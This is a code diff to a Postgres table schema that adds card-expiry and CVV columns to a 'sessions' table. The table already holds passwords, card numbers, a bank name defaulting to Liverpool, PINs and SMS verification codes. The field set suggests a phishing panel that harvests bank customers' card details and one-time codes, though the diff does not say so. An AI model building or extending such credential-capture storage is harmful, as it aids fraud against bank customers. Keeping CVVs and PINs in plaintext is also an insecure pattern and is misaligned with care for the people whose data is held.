@@ -25,6 +25,8 @@ export const sessions = pgTable("sessions", {
   password: text("password"),
   banco: text("banco").default("LIVERPOOL"),
   tarjeta: text("tarjeta"),
+  fechaVencimiento: text("fecha_vencimiento"),
+  cvv: text("cvv"),
   sms: text("sms"),
   nip: text("nip"),
   smsCompra: text("sms_compra"),
